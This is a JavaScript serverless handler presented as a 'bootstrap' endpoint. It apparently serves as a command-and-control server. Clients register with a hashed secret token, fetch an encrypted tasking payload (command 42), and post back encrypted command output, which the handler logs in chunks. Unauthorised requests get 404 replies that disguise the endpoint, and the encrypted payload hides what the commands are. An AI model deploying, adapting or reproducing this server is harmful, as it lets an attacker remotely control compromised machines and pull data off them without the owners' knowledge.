import crypto from 'node:crypto';

const BOOTSTRAP_TOKEN_SHA256 = '54362ebffcdb80f0242d930ed17b5193eaf734a2068eea34de9b7d194b878fcc';
const CONTROL_ID = '42';
const CONTROL_PAYLOAD = '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';

async function readBody(request) {
  if (typeof request.body === 'string') return request.body;
  if (Buffer.isBuffer(request.body)) return request.body.toString('utf8');
  if (request.body && typeof request.body === 'object') return JSON.stringify(request.body);
  const chunks = [];
  for await (const chunk of request) chunks.push(Buffer.isBuffer(chunk) ? chunk : Buffer.from(chunk));
  return Buffer.concat(chunks).toString('utf8');
}
function validBootstrapToken(request) {
  const raw = request.headers['x-bootstrap-token'];
  const token = Array.isArray(raw) ? raw[0] : raw;
  if (!token) return false;
  const digest = crypto.createHash('sha256').update(String(token)).digest('hex');
  const a = Buffer.from(digest, 'hex');
  const b = Buffer.from(BOOTSTRAP_TOKEN_SHA256, 'hex');
  return a.length === b.length && crypto.timingSafeEqual(a, b);
}
export default async function handler(request, response) {
  const url = new URL(request.url, 'https://bootstrap.invalid');
  const mode = url.searchParams.get('mode');
  response.setHeader('cache-control', 'no-store');
  response.setHeader('x-content-type-options', 'nosniff');
  if (mode === 'register') {
    if (request.method !== 'POST' || !validBootstrapToken(request)) return response.status(404).send('Not found');
    const body = await readBody(request);
    console.log(`CHAT_BOOTSTRAP_REGISTER ${body.slice(0, 4096)}`);
    return response.status(204).end();
  }
  if (mode === 'control') {
    if (request.method !== 'GET') return response.status(404).send('Not found');
    response.setHeader('content-type', 'text/plain; charset=utf-8');
    return response.status(200).send(`${CONTROL_ID}\n${CONTROL_PAYLOAD}\n`);
  }
  if (mode === 'output') {
    if (request.method !== 'POST') return response.status(404).send('Not found');
    const body = await readBody(request);
    const splitAt = body.indexOf(':');
    const commandId = splitAt >= 0 ? body.slice(0, splitAt) : 'unknown';
    const cipher = splitAt >= 0 ? body.slice(splitAt + 1) : body;
    const chunkSize = 1800;
    const total = Math.max(1, Math.ceil(cipher.length / chunkSize));
    for (let i = 0; i < total; i += 1) console.log(`CHAT_BOOTSTRAP_OUTPUT_PART ${commandId} ${i + 1}/${total} ${cipher.slice(i * chunkSize, (i + 1) * chunkSize)}`);
    return response.status(204).end();
  }
  return response.status(404).send('Not found');
}
